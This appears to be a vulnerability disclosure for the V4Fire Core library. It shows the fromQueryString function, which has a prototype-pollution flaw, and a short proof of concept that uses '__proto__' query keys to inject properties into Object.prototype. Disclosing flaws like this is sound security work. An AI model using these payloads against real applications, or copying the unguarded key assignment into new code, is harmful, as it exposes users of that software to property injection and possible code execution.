## V4Fire Core Library

URL: https://github.com/V4Fire/Core

### Vulnerable code fragment

```js
export function fromQueryString(query: string, opts: FromQueryStringOptions): Dictionary<string | null>;
export function fromQueryString(
    query: string,
    optsOrDecode?: FromQueryStringOptions | boolean
): Dictionary<string | null> {
    query = query.replace(normalizeURLRgxp, '');

    const
        queryObj = {};

    if (query === '') {
        return queryObj;
    }

    let
        opts: FromQueryStringOptions;

    if (Object.isPlainObject(optsOrDecode)) {
        opts = optsOrDecode;

    } else {
        opts = {decode: optsOrDecode};
    }

    if (opts.decode !== false) {
        query = decodeURIComponent(query);
    }

    const
        indexes = Object.createDict<number>(),
        objOpts = {separator: opts.arraySyntax ? ']' : opts.separator},
        variables = query.split('&');

    for (let i = 0; i < variables.length; i++) {
        let
            [key, val = null] = variables[i].split('=');

        if (opts.arraySyntax) {
            let
                path = '',
                nestedArray = false;

            key = key.replace(arraySyntax, (str, prop, lastIndex) => {
                if (path === '') {
                    path += key.slice(0, lastIndex);
                }

                path += str;

                if (prop === '') {
                    if (nestedArray) {
                        prop = '0';

                    } else {
                        prop = indexes[path] ?? '0';
                        indexes[path] = Number(prop) + 1;
                    }

                    nestedArray = true;
                }

                return `]${prop}`;
            });
        }

        const
            oldVal = objOpts.separator != null ? Object.get(queryObj, key, objOpts) : queryObj[key];

        let
            normalizedVal = opts.convert !== false ? Object.parse(val, convertIfDate) : val;

        if (oldVal !== undefined) {
            normalizedVal = Array.concat([], oldVal, Object.isArray(normalizedVal) ? [normalizedVal] : normalizedVal);
        }

        if (objOpts.separator != null) {
            Object.set(queryObj, key, normalizedVal, objOpts);

        } else {
            queryObj[key] = normalizedVal;
        }
    }

    return queryObj;
}  
```

### PoC
```
location.search = '?__proto__.test=test'
url_convert.fromQueryString(location.search, {separator: '.'})

location.search = '?__proto__[test]=test'
url_convert.fromQueryString(location.search, {arraySyntax: true})
```